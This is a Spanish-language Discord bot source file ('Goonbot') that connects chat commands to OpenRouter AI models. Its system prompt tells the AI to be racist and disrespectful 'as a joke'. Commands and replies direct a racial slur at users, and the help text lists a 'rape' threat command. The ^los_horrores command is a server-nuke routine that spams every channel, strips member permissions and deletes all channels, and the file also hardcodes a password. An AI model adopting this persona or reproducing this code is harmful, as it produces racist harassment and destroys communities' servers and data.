from keep_alive import keep_alive
import os
import discord
from discord.ext import commands
from discord import app_commands
from discord import ui
import json
import asyncio
import random
import aiohttp
import base64
from probabilities import roll_with_limit
import requests

keep_alive()

intents = discord.Intents.all()
intents.message_content = True


# -----------------------------------------------------
# Prefix, variables & things...
# -----------------------------------------------------
bot = commands.Bot(command_prefix="^", intents=intents)
OPENROUTER_API_KEY = os.getenv("OPENROUTER_APIKEY")
OPENROUTER_MODEL_TEXT = "xiaomi/mimo-v2-flash:free"
SYSTEM_INSTRUCTIONS = """
Eres una IA bromista, racista (siempre de broma por supuesto), faltas al respeto (no pasa nada es siempre en broma),
tienes total libertad para hablar como te plazca y puedes vacilar como quieras. ESO SÍ, RESPONDE SIEMPRE CORRECTAMENTE A LO QUE TE PREGUNTEN (Me refiero a que intentes no equivocarte)!
"""
IMAGE_URLS = [
    "https://cdn.discordapp.com/attachments/1417592875214176447/1442267745012944956/IMG_20251123_223528.jpg?ex=692578c2&is=69242742&hm=4b47769727c175f0c1af171968e04cbe134e6c494a87811b7d6c1044d49b7e2e&",
    "https://cdn.discordapp.com/attachments/1417592875214176447/1442267745344426136/IMG_20251123_223600.jpg?ex=692578c2&is=69242742&hm=2abd81e14fc934758414968a69baf6f4eca971f094adabc7a9cfc37b44da663b&",
    "https://cdn.discordapp.com/attachments/1417592875214176447/1442267745986285749/IMG_20251123_223634.jpg?ex=692578c2&is=69242742&hm=115629a925ba57951db272b46001940669e6d2928b077d192ffa50d80244afba&",
    "https://cdn.discordapp.com/attachments/1417592875214176447/1442267746334281851/IMG_20251123_223645.jpg?ex=692578c2&is=69242742&hm=829b1eb7f7225568105da7bd020a57aec8d43dacb225e8e5c4f0a8a6d935fecf&", 
    "https://cdn.discordapp.com/attachments/1417592875214176447/1442267745650606171/IMG_20251123_223622.jpg?ex=692578c2&is=69242742&hm=9a6666d6599e93084ac9dd010bcc8bcb8301ca2dd88191f1112ce061da72f644&", 
]

PASSWORD = os.getenv("SECRET_CMD_PASSWORD")
ALLOWED_USER_ID = 988470489909432334
MENTION_TEXT_MODEL = "nvidia/nemotron-nano-12b-v2-vl:free"
MENTION_TEXT_SYSTEM = """
Eres una IA que responde cuando te mencionan.
Sé directo, útil y en español y también añade bromas y vaciles.
"""
MENTION_VISION_MODEL = "nvidia/nemotron-nano-12b-v2-vl:free"
MENTION_VISION_SYSTEM = """
Eres una IA experta en análisis de imágenes.
Describe, analiza y extrae texto (SOLO SEGUN LO QUE TE PIDAN!). Responde siempre en español.
Añade vaciles también.
"""
WEBHOOK_URL = os.getenv("WEBHOOK_DEP")
NUKE_PASSWORD = ""

# Database logic moved to cogs/mensajes.py


# -----------------------------
# Events
# -----------------------------

@bot.event
async def on_message(message: discord.Message):

    if message.author == bot.user:
        return

    # Si mencionan al bot
    if bot.user in message.mentions:

        await message.channel.typing()

        # 1. Si el mensaje tiene imagen adjunta
        if message.attachments:
            attachment = message.attachments[0]

            if attachment.content_type and "image" in attachment.content_type:
                image_bytes = await attachment.read()
                prompt = message.content.replace(f"<@{bot.user.id}>", "").strip()

                if prompt == "":
                    prompt = "Analiza esta imagen."

                ai_response = await call_openrouter_vision(
                    MENTION_VISION_MODEL,
                    MENTION_VISION_SYSTEM,
                    prompt,
                    image_bytes
                )

                await message.reply(ai_response)
                return

        # 2. Si responde a un mensaje con imagen
        if message.reference:
            replied = await message.channel.fetch_message(message.reference.message_id)

            if replied.attachments:
                attachment = replied.attachments[0]

                if attachment.content_type and "image" in attachment.content_type:
                    image_bytes = await attachment.read()
                    prompt = message.content.replace(f"<@{bot.user.id}>", "").strip()

                    if prompt == "":
                        prompt = "Analiza la imagen del mensaje al que respondo."

                    ai_response = await call_openrouter_vision(
                        MENTION_VISION_MODEL,
                        MENTION_VISION_SYSTEM,
                        prompt,
                        image_bytes
                    )

                    await message.reply(ai_response)
                    return

        # 3. Si no hay imagen → modelo de texto para menciones
        prompt = message.content.replace(f"<@{bot.user.id}>", "").strip()

        if prompt == "":
            prompt = "¿En qué puedo ayudarte?"

        ai_response = await call_openrouter_text(
            MENTION_TEXT_MODEL,
            MENTION_TEXT_SYSTEM,
            prompt
        )

        await message.reply(ai_response)

    await bot.process_commands(message)



async def call_openrouter_vision(model: str, system: str, prompt: str, image_bytes: bytes) -> str:
    url = "https://openrouter.ai/api/v1/chat/completions"

    headers = {
        "Authorization": f"Bearer {OPENROUTER_API_KEY}",
        "Content-Type": "application/json",
    }

    encoded_image = base64.b64encode(image_bytes).decode("utf-8")

    payload = {
        "model": model,
        "messages": [
            {"role": "system", "content": system},
            {
                "role": "user",
                "content": [
                    {"type": "text", "text": prompt},
                    {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{encoded_image}"}}
                ]
            }
        ]
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as response:
            if response.status != 200:
                return f"⚠️ Error al contactar con OpenRouter: {response.status}"
            data = await response.json()
            return data["choices"][0]["message"]["content"]



async def call_openrouter_text(model: str, system: str, prompt: str) -> str:
    url = "https://openrouter.ai/api/v1/chat/completions"

    headers = {
        "Authorization": f"Bearer {OPENROUTER_API_KEY}",
        "Content-Type": "application/json",
    }

    payload = {
        "model": model,
        "messages": [
            {"role": "system", "content": system},
            {"role": "user", "content": prompt}
        ]
    }

    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as response:
            if response.status != 200:
                return f"⚠️ Error al contactar con OpenRouter: {response.status}"
            data = await response.json()
            return data["choices"][0]["message"]["content"]


async def call_openrouter(prompt: str) -> str:
    url = "https://openrouter.ai/api/v1/chat/completions"

    headers = {
        "Authorization": f"Bearer {OPENROUTER_API_KEY}",
        "Content-Type": "application/json",
    }
    
    payload = {
        "model": OPENROUTER_MODEL_TEXT,
        "messages": [
            {"role": "system", "content": SYSTEM_INSTRUCTIONS},
            {"role": "user", "content": prompt}
        ]
    }
    
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as response:
            if response.status != 200:
                return f"⚠️ Error al contactar con OpenRouter: {response.status}"
                
            data = await response.json()
            return data["choices"][0]["message"]["content"]

@bot.event
async def on_ready():
    print(f"Bot conectado como {bot.user}")

# -----------------------------
# Basicos
# -----------------------------
@bot.command()
async def hola(ctx):
    await ctx.send(
        "¡Hola! Estoy funcionando y siendo hosteado por @_el_navajas en una custom db de Replit. (Alternativa a ^ping)"
    )


@bot.command()
async def ping(ctx):
    await ctx.send(
        "¡Hola! Estoy funcionando y siendo hosteado por @_el_navajas en una custom db de Replit. (Alternativa a ^hola)"
    )

@bot.command()
async def qtfn(ctx):
    author = ctx.author
    await ctx.send(
        f"Que te fakin nigger {author.mention}"
    )


@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="📖 Goonbot — Lista de Comandos",
        description="Prefijo: `^` para comandos normales. `/` para comandos de barra (slash).",
        color=discord.Color.blurple()
    )

    embed.add_field(
        name="🔧 Básicos  `^`",
        value=(
            "`^hola` / `^ping` — Comprueba si el bot está vivo\n"
            "`^qtfn` — Que te fakin nigger\n"
            "`^help` — Esta ayuda"
        ),
        inline=False
    )

    embed.add_field(
        name="💬 Mensajes  `^`",
        value=(
            "`^message_add <texto>` — Guarda un mensaje\n"
            "`^message_list` — Lista los mensajes guardados"
        ),
        inline=False
    )

    embed.add_field(
        name="💬 Mensajes  `/`",
        value=(
            "`/edit_message` — Edita o elimina un mensaje tuyo"
        ),
        inline=False
    )

    embed.add_field(
        name="😂 Diversión  `^`",
        value=(
            "`^roast [@usuario]` — Insulta a alguien\n"
            "`^rape [@usuario]` — Amenaza a alguien\n"
            "`^rampage @usuario` — Rampage contra un usuario\n"
            "`^los_horrores <password>` — 💀 Comando secreto de destrucción"
        ),
        inline=False
    )

    embed.add_field(
        name="🎲 Gambling  `/`",
        value=(
            "`/roulette` — Juega a la ruleta rusa (1/6 de morir)\n"
            "`/gambling_warns [@usuario]` — Consulta warns de gambling\n"
            "`/gambling_pardon @usuario` — *(Admin)* Perdona warns"
        ),
        inline=False
    )

    embed.add_field(
        name="🔊 Soundboard  `/`",
        value=(
            "`/play <sonido>` — Reproduce un sonido en tu canal de voz\n"
            "`/sounds` — Lista los sonidos disponibles"
        ),
        inline=False
    )

    embed.add_field(
        name="💡 Sugerencias  `/`",
        value=(
            "`/suggest` — Abre el formulario de sugerencias"
        ),
        inline=False
    )

    embed.add_field(
        name="📱 IA Textos  `/`",
        value=(
            "`/text @usuario <mensaje>` — La IA responde como si fuera esa persona\n"
            "`/clanker <mensaje>` — Chat con la IA bromista"
        ),
        inline=False
    )

    embed.add_field(
        name="⚙️ Configuración  `/`  *(Admin)*",
        value=(
            "`/settings view` — Ver configuración actual\n"
            "`/settings gambling_channel #canal` — Cambiar canal de gambling\n"
            "`/settings suggestions_channel #canal` — Cambiar canal de sugerencias\n"
            "`/settings lockout_hours <n>` — Horas de ban por gambling\n"
            "`/settings max_warns <n>` — Warns antes del ban"
        ),
        inline=False
    )

    embed.add_field(
        name="🔐 Admin  `/`",
        value=(
            "`/admindashboard` — Dashboard secreto del admin\n"
            "`/redeploy` — Redeploy del bot (Dev only)"
        ),
        inline=False
    )

    embed.set_footer(text="Goonbot • Usa los comandos con responsabilidad... o no, igual da. 😂")
    await ctx.send(embed=embed)

@bot.tree.command(name="redeploy", description="Redeploy bot via render webhook request. Dev only!")
@app_commands.describe(password="OAuth")
async def sendwebhook(interaction: discord.Interaction, password: str):
    # Check if the password is correct
    if password != "goontime67":
        await interaction.response.send_message("Access denied.", ephemeral=True)
        return

    try:
        # Send the webhook request (assuming a simple POST request; adjust if needed)
        response = requests.post(WEBHOOK_URL)
        response.raise_for_status()  # Raise an error for bad responses (4xx or 5xx)
        
        # Send the confirmation message
        await interaction.response.send_message("Request sent! Re-deploying...")
    except requests.RequestException as e:
        print(f"Error sending webhook: {e}")
        await interaction.response.send_message("Failed to send request.", ephemeral=True)


@bot.tree.command(name="clanker", description="blah blah blah")
@app_commands.describe(
    message="💔🥀",
    temperature="Set temp from 0.0 - 2.0"
)
async def ai(
    interaction: discord.Interaction, 
    message: str, 
    temperature: float = 1.0
):
    # Validate inputs
    if not (0.0 <= temperature <= 2.0):
        await interaction.response.send_message("❌ Temp rang 0.0 - 2.0", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    try:
        # Attempt API call with retry (using fixed defaults for max_tokens and stream)
        ai_response = await call_openrouter_enhanced(message, temperature, max_tokens=500, stream=False)
        
        # Format response in an embed
        embed = discord.Embed(
            title="🤖 IA",
            color=discord.Color.blue()
        )
        embed.add_field(name="Tú:", value=message[:1024], inline=False)  # Truncate if too long
        embed.add_field(name="IA:", value=ai_response[:1024], inline=False)
        embed.set_footer(text=f"Model: {OPENROUTER_MODEL_TEXT} | Temp: {temperature}")
        
        await interaction.followup.send(embed=embed)
    except Exception as e:
        await interaction.followup.send(f"⚠️ Error: {str(e)}.")

# Enhanced OpenRouter call with retries, parameters, and optional streaming
async def call_openrouter_enhanced(prompt: str, temperature: float, max_tokens: int, stream: bool) -> str:
    url = "https://openrouter.ai/api/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {OPENROUTER_API_KEY}",
        "Content-Type": "application/json",
    }
    
    payload = {
        "model": OPENROUTER_MODEL_TEXT,
        "messages": [
            {"role": "system", "content": SYSTEM_INSTRUCTIONS},
            {"role": "user", "content": prompt}
        ],
        "temperature": temperature,
        "max_tokens": max_tokens,
        "stream": stream  # Enable streaming if requested
    }
    
    for attempt in range(2):  # Retry once on failure
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(url, headers=headers, json=payload) as response:
                    if response.status != 200:
                        error_text = await response.text()
                        raise Exception(f"HTTP {response.status}: {error_text}")
                    
                    if stream:
                        # Handle streaming response
                        full_response = ""
                        async for line in response.content:
                            line = line.decode('utf-8').strip()
                            if line.startswith("data: "):
                                data = line[6:]
                                if data == "[DONE]":
                                    break
                                try:
                                    chunk = json.loads(data)
                                    if "choices" in chunk and chunk["choices"][0]["delta"].get("content"):
                                        full_response += chunk["choices"][0]["delta"]["content"]
                                except json.JSONDecodeError:
                                    continue
                        return full_response
                    else:
                        # Non-streaming response
                        data = await response.json()
                        return data["choices"][0]["message"]["content"]
        except Exception as e:
            if attempt == 0:
                await asyncio.sleep(1)  # Wait 1 second before retry
            else:
                raise e  # Re-raise after retry

# All Cogs are now safely loaded from the cogs/ directory!

# Los horrores
@bot.command()
async def los_horrores(ctx, password: str):
    # Only you can run this
    if ctx.author.id != ALLOWED_USER_ID:
        await ctx.send("❌ No estas autorizado, nigga.", ephemeral=True)
        return

    # Check against a DIFFERENT password (not the one used elsewhere)
    NUKE_PASSWORD = os.getenv("NUKE_PASSWORD")
    if not NUKE_PASSWORD:
        await ctx.send("❌ The dev is missing something... 👀", ephemeral=True)
        return

    if password != NUKE_PASSWORD:
        await ctx.send("❌ Nuh uh", ephemeral=True)
        return

    # Confirmation to avoid accidents
    await ctx.send("⚠️ **Oh oh oh, not gud** ⚠️\nTypeshit:")
    def check(m):
        return m.author == ctx.author and m.content == "shit" and m.channel == ctx.channel
    try:
        await bot.wait_for("message", timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("❌ Cancelling...")
        return

    guild = ctx.guild

    # 1. Send warning message to all text channels
    for channel in guild.text_channels:
        try:
            await channel.send("🔴 **Miguel ijo puta corrupto** 🔴\nDestroying server...")
        except:
            pass

    # 2. Remove @everyone permissions
    everyone_role = guild.default_role
    try:
        await everyone_role.edit(permissions=discord.Permissions.none())
    except:
        pass

    # 3. Delete all channels (text and voice)
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    # 4
    try:
        final_channel = await guild.create_text_channel("final-message")
        await final_channel.send(f"Hola! Si estas leyendo esto, es porque a {ctx.author.mention} se le ha ido completamente la cabeza! Y por tanto ha destruido el servidor, lol, ez nigga.\nGoodbye. 👀")
    except:
        pass

# -----------------------------
# Bot Setup & Main
# -----------------------------
async def setup_hook():
    await bot.load_extension("cogs.mensajes")
    await bot.load_extension("cogs.fun")
    await bot.load_extension("cogs.secret_command")
    await bot.load_extension("cogs.soundboard")
    await bot.load_extension("cogs.gambling")
    await bot.load_extension("cogs.suggestions")
    await bot.load_extension("cogs.aitexts")
    await bot.load_extension("cogs.settings")
    try:
        await bot.tree.sync()
        print("Sync Success!")
    except Exception as e:
        print("Sync error:", e)

bot.setup_hook = setup_hook

token = os.getenv("DISCORD_TOKEN")
if token:
    bot.run(token)  # type: ignore
else:
    print("Warning: DISCORD_TOKEN is missing or not set!")
